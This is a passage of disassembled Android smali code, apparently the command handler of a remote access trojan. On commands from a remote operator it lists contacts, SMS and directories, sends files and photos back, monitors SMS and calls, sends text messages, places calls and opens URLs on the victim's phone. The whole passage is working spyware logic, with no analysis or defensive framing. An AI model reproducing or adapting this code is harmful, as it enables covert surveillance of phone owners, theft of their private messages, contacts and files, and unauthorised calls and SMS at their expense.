    iget-object v2, v2, Lmy/app/client/ClientListener;->callMonitor:Lmy/app/Library/CallMonitor;

    invoke-virtual {v2}, Lmy/app/Library/CallMonitor;->stop()V

    .line 122
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const/4 v4, 0x0

    iput-object v4, v2, Lmy/app/client/ClientListener;->callMonitor:Lmy/app/Library/CallMonitor;

    .line 123
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Call monitoring stopped"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 125
    :cond_9
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GET_CONTACTS:S

    if-ne v2, v4, :cond_a

    .line 127
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Contacts request received"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 128
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, p0

    iget-object v4, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v4}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v4

    move/from16 v0, p3

    invoke-static {v2, v0, v4}, Lmy/app/Library/ContactsLister;->listContacts(Lmy/app/client/ClientListener;I[B)Z

    move-result v2

    if-nez v2, :cond_1

    .line 129
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "No contact to return"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 131
    :cond_a
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->LIST_DIR:S

    if-ne v2, v4, :cond_b

    .line 133
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "List directory request received"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 134
    new-instance v14, Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v2}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v2

    invoke-direct {v14, v2}, Ljava/lang/String;-><init>([B)V

    .line 135
    .local v14, file:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move/from16 v0, p3

    invoke-static {v2, v0, v14}, Lmy/app/Library/DirLister;->listDir(Lmy/app/client/ClientListener;ILjava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_1

    .line 136
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "Directory: "

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, " not found"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 138
    .end local v14           #file:Ljava/lang/String;
    :cond_b
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GET_FILE:S

    if-ne v2, v4, :cond_c

    .line 140
    new-instance v14, Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v2}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v2

    invoke-direct {v14, v2}, Ljava/lang/String;-><init>([B)V

    .line 141
    .restart local v14       #file:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "Download file "

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, " request received"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 142
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Lmy/app/Library/FileDownloader;

    move-object/from16 v0, p0

    iget-object v6, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    invoke-direct {v4, v6}, Lmy/app/Library/FileDownloader;-><init>(Lmy/app/client/ClientListener;)V

    iput-object v4, v2, Lmy/app/client/ClientListener;->fileDownloader:Lmy/app/Library/FileDownloader;

    .line 143
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->fileDownloader:Lmy/app/Library/FileDownloader;

    move/from16 v0, p3

    invoke-virtual {v2, v14, v0}, Lmy/app/Library/FileDownloader;->downloadFile(Ljava/lang/String;I)Z

    goto/16 :goto_0

    .line 145
    .end local v14           #file:Ljava/lang/String;
    :cond_c
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GET_PICTURE:S

    if-ne v2, v4, :cond_d

    .line 147
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Photo picture request received"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 150
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Lmy/app/Library/PhotoTaker;

    move-object/from16 v0, p0

    iget-object v6, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move/from16 v0, p3

    invoke-direct {v4, v6, v0}, Lmy/app/Library/PhotoTaker;-><init>(Lmy/app/client/ClientListener;I)V

    iput-object v4, v2, Lmy/app/client/ClientListener;->photoTaker:Lmy/app/Library/PhotoTaker;

    .line 151
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->photoTaker:Lmy/app/Library/PhotoTaker;

    invoke-virtual {v2}, Lmy/app/Library/PhotoTaker;->takePhoto()Z

    move-result v2

    if-nez v2, :cond_1

    .line 152
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Something went wrong while taking the picture"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 154
    :cond_d
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->DO_TOAST:S

    if-ne v2, v4, :cond_e

    .line 156
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, p0

    iget-object v4, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v6, Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v7, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v7}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/String;-><init>([B)V

    const/4 v7, 0x1

    invoke-static {v4, v6, v7}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v4

    iput-object v4, v2, Lmy/app/client/ClientListener;->toast:Landroid/widget/Toast;

    .line 157
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->toast:Landroid/widget/Toast;

    invoke-virtual {v2}, Landroid/widget/Toast;->show()V

    goto/16 :goto_0

    .line 159
    :cond_e
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->SEND_SMS:S

    if-ne v2, v4, :cond_10

    .line 161
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v2}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v2

    invoke-static {v2}, Lutils/EncoderHelper;->decodeHashMap([B)Ljava/util/HashMap;

    move-result-object v16

    .line 162
    .local v16, information:Ljava/util/Map;,"Ljava/util/Map<Ljava/lang/String;Ljava/lang/String;>;"
    const-string v2, "number"

    move-object/from16 v0, v16

    invoke-interface {v0, v2}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    .line 163
    .local v3, num:Ljava/lang/String;
    const-string v2, "body"

    move-object/from16 v0, v16

    invoke-interface {v0, v2}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/String;

    .line 164
    .local v5, text:Ljava/lang/String;
    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v2

    array-length v2, v2

    const/16 v4, 0xa7

    if-ge v2, v4, :cond_f

    .line 165
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v2

    const/4 v4, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    invoke-virtual/range {v2 .. v7}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 171
    :goto_1
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "SMS sent"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 168
    :cond_f
    move-object/from16 v0, p0

    invoke-direct {v0, v5}, Lmy/app/client/ProcessCommand;->MessageDecoupator(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v9

    .line 169
    .local v9, multipleMsg:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v6

    const/4 v8, 0x0

    const/4 v10, 0x0

    const/4 v11, 0x0

    move-object v7, v3

    invoke-virtual/range {v6 .. v11}, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V

    goto :goto_1

    .line 173
    .end local v3           #num:Ljava/lang/String;
    .end local v5           #text:Ljava/lang/String;
    .end local v9           #multipleMsg:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    .end local v16           #information:Ljava/util/Map;,"Ljava/util/Map<Ljava/lang/String;Ljava/lang/String;>;"
    :cond_10
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GIVE_CALL:S

    if-ne v2, v4, :cond_11

    .line 175
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v4, "tel:"

    invoke-direct {v2, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-instance v4, Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v6, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v6}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v6

    invoke-direct {v4, v6}, Ljava/lang/String;-><init>([B)V

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v18

    .line 176
    .local v18, uri:Ljava/lang/String;
    new-instance v2, Landroid/content/Intent;

    const-string v4, "android.intent.action.CALL"

    invoke-static/range {v18 .. v18}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v6

    invoke-direct {v2, v4, v6}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    move-object/from16 v0, p0

    iput-object v2, v0, Lmy/app/client/ProcessCommand;->intent:Landroid/content/Intent;

    .line 177
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->intent:Landroid/content/Intent;

    const/high16 v4, 0x1000

    invoke-virtual {v2, v4}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 178
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, p0

    iget-object v4, v0, Lmy/app/client/ProcessCommand;->intent:Landroid/content/Intent;

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_0

    .line 180
    .end local v18           #uri:Ljava/lang/String;
    :cond_11
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GET_SMS:S

    if-ne v2, v4, :cond_12

    .line 182
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "SMS list request received"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 183
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, p0

    iget-object v4, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v4}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v4

    move/from16 v0, p3

    invoke-static {v2, v0, v4}, Lmy/app/Library/SMSLister;->listSMS(Lmy/app/client/ClientListener;I[B)Z

    move-result v2

    if-nez v2, :cond_1

    .line 184
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "No SMS match for filter"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 186
    :cond_12
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->MONITOR_SMS:S

    if-ne v2, v4, :cond_13

    .line 188
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Start SMS monitoring"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 189
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Lmy/app/Library/SMSMonitor;

    move-object/from16 v0, p0

    iget-object v6, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move-object/from16 v0, p0

    iget-object v7, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v7}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v7

    move/from16 v0, p3

    invoke-direct {v4, v6, v0, v7}, Lmy/app/Library/SMSMonitor;-><init>(Lmy/app/client/ClientListener;I[B)V

    iput-object v4, v2, Lmy/app/client/ClientListener;->smsMonitor:Lmy/app/Library/SMSMonitor;

    goto/16 :goto_0

    .line 191
    :cond_13
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->STOP_MONITOR_SMS:S

    if-ne v2, v4, :cond_14

    .line 193
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->smsMonitor:Lmy/app/Library/SMSMonitor;

    invoke-virtual {v2}, Lmy/app/Library/SMSMonitor;->stop()V

    .line 194
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const/4 v4, 0x0

    iput-object v4, v2, Lmy/app/client/ClientListener;->smsMonitor:Lmy/app/Library/SMSMonitor;

    .line 195
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "SMS monitoring stopped"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 197
    :cond_14
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    const/16 v4, 0x15

    if-ne v2, v4, :cond_15

    .line 199
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    invoke-virtual/range {p0 .. p0}, Lmy/app/client/ProcessCommand;->loadPreferences()LPacket/PreferencePacket;

    move-result-object v4

    invoke-virtual {v4}, LPacket/PreferencePacket;->build()[B

    move-result-object v4

    move/from16 v0, p3

    invoke-virtual {v2, v0, v4}, Lmy/app/client/ClientListener;->handleData(I[B)V

    goto/16 :goto_0

    .line 201
    :cond_15
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    const/16 v4, 0x14

    if-ne v2, v4, :cond_16

    .line 203
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "Preferences received"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendInformation(Ljava/lang/String;)V

    .line 204
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v2}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v2

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lmy/app/client/ProcessCommand;->savePreferences([B)V

    .line 205
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    invoke-virtual {v2}, Lmy/app/client/ClientListener;->loadPreferences()V

    goto/16 :goto_0

    .line 207
    :cond_16
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->GET_ADV_INFORMATIONS:S

    if-ne v2, v4, :cond_17

    .line 208
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Lmy/app/Library/AdvancedSystemInfo;

    move-object/from16 v0, p0

    iget-object v6, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    move/from16 v0, p3

    invoke-direct {v4, v6, v0}, Lmy/app/Library/AdvancedSystemInfo;-><init>(Lmy/app/client/ClientListener;I)V

    iput-object v4, v2, Lmy/app/client/ClientListener;->advancedInfos:Lmy/app/Library/AdvancedSystemInfo;

    .line 209
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    iget-object v2, v2, Lmy/app/client/ClientListener;->advancedInfos:Lmy/app/Library/AdvancedSystemInfo;

    invoke-virtual {v2}, Lmy/app/Library/AdvancedSystemInfo;->getInfos()V

    goto/16 :goto_0

    .line 211
    :cond_17
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->OPEN_BROWSER:S

    if-ne v2, v4, :cond_18

    .line 212
    new-instance v19, Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v2}, Ljava/nio/ByteBuffer;->array()[B

    move-result-object v2

    move-object/from16 v0, v19

    invoke-direct {v0, v2}, Ljava/lang/String;-><init>([B)V

    .line 213
    .local v19, url:Ljava/lang/String;
    new-instance v15, Landroid/content/Intent;

    const-string v2, "android.intent.action.VIEW"

    invoke-static/range {v19 .. v19}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v4

    invoke-direct {v15, v2, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 214
    .local v15, i:Landroid/content/Intent;
    const/high16 v2, 0x1000

    invoke-virtual {v15, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 215
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    invoke-virtual {v2, v15}, Lmy/app/client/ClientListener;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_0

    .line 217
    .end local v15           #i:Landroid/content/Intent;
    .end local v19           #url:Ljava/lang/String;
    :cond_18
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    sget-short v4, Linout/Protocol;->DO_VIBRATE:S

    if-ne v2, v4, :cond_19

    .line 218
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    const-string v4, "vibrator"

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v20

    check-cast v20, Landroid/os/Vibrator;

    .line 219
    .local v20, v:Landroid/os/Vibrator;
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->arguments:Ljava/nio/ByteBuffer;

    invoke-virtual {v2}, Ljava/nio/ByteBuffer;->getLong()J

    move-result-wide v12

    .line 220
    .local v12, duration:J
    move-object/from16 v0, v20

    invoke-virtual {v0, v12, v13}, Landroid/os/Vibrator;->vibrate(J)V

    goto/16 :goto_0

    .line 223
    .end local v12           #duration:J
    .end local v20           #v:Landroid/os/Vibrator;
    :cond_19
    move-object/from16 v0, p0

    iget-short v2, v0, Lmy/app/client/ProcessCommand;->commande:S

    const/4 v4, 0x5

    if-ne v2, v4, :cond_1a

    .line 224
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    invoke-virtual {v2}, Lmy/app/client/ClientListener;->onDestroy()V

    goto/16 :goto_0

    .line 227
    :cond_1a
    move-object/from16 v0, p0

    iget-object v2, v0, Lmy/app/client/ProcessCommand;->client:Lmy/app/client/ClientListener;

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v6, "Command: "

    invoke-direct {v4, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-short v6, v0, Lmy/app/client/ProcessCommand;->commande:S

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v6, " unknown"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Lmy/app/client/ClientListener;->sendError(Ljava/lang/String;)V

    goto/16 :goto_0
.end method
